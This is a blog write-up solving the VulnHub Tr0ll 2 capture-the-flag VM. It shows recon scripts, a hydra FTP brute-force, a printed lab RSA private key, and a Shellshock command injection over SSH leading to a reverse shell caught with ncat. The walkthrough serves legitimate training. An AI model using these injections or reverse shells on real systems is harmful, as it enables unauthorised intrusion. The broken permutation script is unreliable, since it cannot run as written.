+++
date = "2014-12-20T16:56:53+02:00"
highlight = true
math = false
tags = ["vulnbox", "write-up"]
title = "VulnHub Tr0ll 2 VM write-up"

[header]
  caption = "Tr0ll 2"
  image = ""

+++

{{% alert warning %}}

**Due to my blog transfer I lost some articles bits. This, unfortunately, is one of them. I’ll re-write (complete) this article soon. I’m very sorry.**
{{% /alert %}}
Here we are. After having downloaded and booted the VM I’m greeted by a fantastic ASCII art banner. Isn’t it lovely?
<!--more-->

I did a quick scan and port 21, 22 and 80 were open.

```
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 2.0.8 or later
22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.2.22 ((Ubuntu))
```

Sincerely, I didn’t look for any known vulnerability and jumped immediately on the FTP server.

```
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (trollvm:giulio):
```

Hmmm… no good. There’s no anonymous login. I needed to find another way. What’s in the HTTP server then?
That was the image in the root of the Apache server. There were no clues in the page source either:

```html
<html>
    <img src='tr0ll_again.jpg'>
</html>

<!--Nothing here, Try Harder!>
<!--Author: Tr0ll>
<!--Editor: VIM>
<!-->
```

The thing I did next was checking for some robot-blacklisted directory in the `robots.txt` file. Maybe I could get something useful out of it.
```
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
```
    
Nice list eh? I’ve taken the suggestion in the file (“I hope you scripted this”) and I quickly wrote a Python script which opened each folder and showed me the results:

```python
from http.client import HTTPResponse
from urllib import request
req = request.urlopen("http://192.168.1.63/robots.txt")
for line in req:
    if line.decode('utf-8').startswith('/'):
        test_url = "http://192.168.1.63"
        test_url += line.decode('utf-8')
        try:
            print (line.decode('utf-8'))
            print (request.urlopen(test_url).read())
        except:
            print ("Page not found")
```

And I got this:
```
/noob
<html>
<img src='cat_the_troll.jpg'>
<!--What did you really think to find here? Try Harder!>
</html>
/nope
Page not found
/try_harder
Page not found
/keep_trying
<html>
<img src='cat_the_troll.jpg'>
<!--What did you really think to find here? Try Harder!>
</html>
/isnt_this_annoying
Page not found
/nothing_here
Page not found
/404
Page not found
/LOL_at_the_last_one
Page not found
/trolling_is_fun
Page not found
/zomg_is_this_it
Page not found
/you_found_me
Page not found
/I_know_this_sucks
Page not found
/You_could_give_up
Page not found
/dont_bother
<html>
<img src='cat_the_troll.jpg'>
<!--What did you really think to find here? Try Harder!>
</html>
/will_it_ever_end
Page not found
/I_hope_you_scripted_this
Page not found
/ok_this_is_it
<html>
<img src='cat_the_troll.jpg'>
<!--What did you really think to find here? Try Harder!>
</html>
/stop_whining
Page not found
/why_are_you_still_looking
Page not found
/just_quit
Page not found
/seriously_stop
Page not found
```
So, the only existing folders were `noob`, `keep_trying`, `dont_bother` and `ok_this_is_it`.
Here’s where I got stuck. I was missing something for sure. So I thought that maybe Maleus used some steganography technique so I tried using `steghide`. That lead nowhere. Damn.
Then it struck me. Maybe the cat photos are different in some way.. I checked that out and I was right.
```
3f0745a5f922cdebc591d5d74076c31bb6a93a8f1e1e351f91ec3ee32e980affcc0a8618b36c1ef7761a5687c1e640b5af0f5736fde8380d4a890060ef079a6b cat_the_troll (2).jpg
1367f1a2bc4f74bf636e8359a3e99caaf85e093ae1bf4348c969b133bf7e95445d8b6b97a03b9a7c425b9a42b5ac0b63eaa5b6e478b7b26ccf94a11424bdef9f cat_the_troll (3).jpg
3f0745a5f922cdebc591d5d74076c31bb6a93a8f1e1e351f91ec3ee32e980affcc0a8618b36c1ef7761a5687c1e640b5af0f5736fde8380d4a890060ef079a6b cat_the_troll (4).jpg
3f0745a5f922cdebc591d5d74076c31bb6a93a8f1e1e351f91ec3ee32e980affcc0a8618b36c1ef7761a5687c1e640b5af0f5736fde8380d4a890060ef079a6b cat_the_troll.jpg
ed0b7173ca8e9e47f59f3051bddbd6c0470394be155c2ae2b28911cbe4251b7cab87cdcdb57496b81458009c4a11cd308ea7039d6984b1267f6780285a694db1 tr0ll_again.jpg
```
Hidden in plain sight in one of those cat photos, in my case `cat_the_troll (3)`, there was a string, recovered through a quick use of the `strings` command, which said: 

> “Look Deep within y0ur_self for the answer“

I opened the `y0ur_self` directory on the HTTP server and there was a 1MB long `answer.txt` file waiting to be download. Let’s check that answer then!

```
[... BIG snip ...]
Y29sbG9xdWl1bQo=
Y29sbG9xdWl1bXMK
Y29sbG9xdXkK
Y29sb24K
Y29tYmluZXMK
Y29tYmluZwo=
Y29tYmluaW5nCg==
Y29tYm8K
Y29tYm8K
[ ... VERY VERY VERY BIG snip ... ]
```
    
A base64 encoded dictionary!? Which one is the correct one? But, even more important… what answer to which question? The FTP server?

So I thought that the original clue,  **“Look Deep within y0ur_self for the answer“**, could be somewhere in this file. I coded another little Python script which tried every permutation of the clue, encoded it to base64 and wrote it to a file named `results.txt`.

```python
from base64 import b64encode
from itertools import permutations
phrase = "Look Deep within y0ur_self for the answer"
with open("results.txt", "w") as f:
    for len in range(1, len(phrase.split())):
    list = permutations(phrase.split(), len)
    for permutation in list:
        string = " ".join(permutation)
        b64_string = b64encode(bytes(string, 'utf-8'))
        f.write(str(b64_string.decode('utf-8')))
    f.write("\n")
```

After having created the `results.txt` file I tried to check whether some string was contained in the original `answer.txt` file. No luck. Daaaamn part two.

After a while being stuck again, I realized I was stupid as noone ever was. I didn’t even try do DECODE the dictionary and get some “strange” word in it! So I did decode it and tried to retrieve some valuable word, maybe a very long key, through awk. What I did was:
```
cat answer_decoded.txt | awk '{ print length, $0 }' | sort -n
```    
What I got back was REALLY nice:
```
19 interdenominational
19 nonrepresentational
19 oversimplifications
20 Andrianampoinimerina
20 counterrevolutionary
20 electroencephalogram
20 uncharacteristically
21 electroencephalograms
21 electroencephalograph
22 counterrevolutionaries
22 electroencephalographs
30 ItCantReallyBeThisEasyRightLOL
```
**“ItCantReallyBeThisEasyRight“**? That sounds great, I found something “valuable”… yeah… but… how should I use it?

Since I was not sure about that, I tried to search in the file for something else… something like *“lol“*, *“troll“*, *“noob“*, *“rofl”* and *”zomg“*. I was lucky again, I guess.
```
[...snip...]
noooob_lol
trollololol
[...snip...]
```
With these 3 words plus the Tr0ll one (it appeared in the FTP Banner, do you remember?) I created a super-mini dictionary to use on the FTP server and I fired uphydra. And guess what? I got a match.

> Tr0ll:Tr0ll

My dictionary was useless! Was I tr0lled again!?
```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--  1 0    0      1474 Oct 04 00:09 lmao.zip
226 Directory send OK.
```
Inside `lmao.zip` there was another file called *“noob”* which was password protected. BINGO! My dictionary maybe will come in handy this time!

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
```
Sure it was! The password was **ItCantReallyBeThisEasyRightLOL**.

The next step was obvious. Login as noob through the SSH server.

```
$ ssh -i noob noob@192.168.1.63
TRY HARDER LOL!
Connection to 192.168.1.63 closed.
```
    
DAMN!

Trying to pass it some command like ls, uptime or uname did not work. I think I need some heavy artillery… the Shell Shock bug.
```
$ ssh noob@192.168.1.63 -i noob '() { :;}; echo "I DO NOT NEED TO"'
I DO NOT NEED TO
TRY HARDER LOL!
```
I think it works… right? I’ve then tried to recreate a reverse shell through the Linux built-in special device tcp while listening on my side with ncat on port 9000.

In the meantime…
```
$ ncat -lvp 9000
Ncat: Version 6.46 ( http://nmap.org/ncat )
Ncat: Listening on :::9000
Ncat: Listening on 0.0.0.0:9000
Ncat: Connection from 192.168.1.63.
Ncat: Connection from 192.168.1.63:37682.
bash: no job control in this shell
noob@Tr0ll2:~$
```

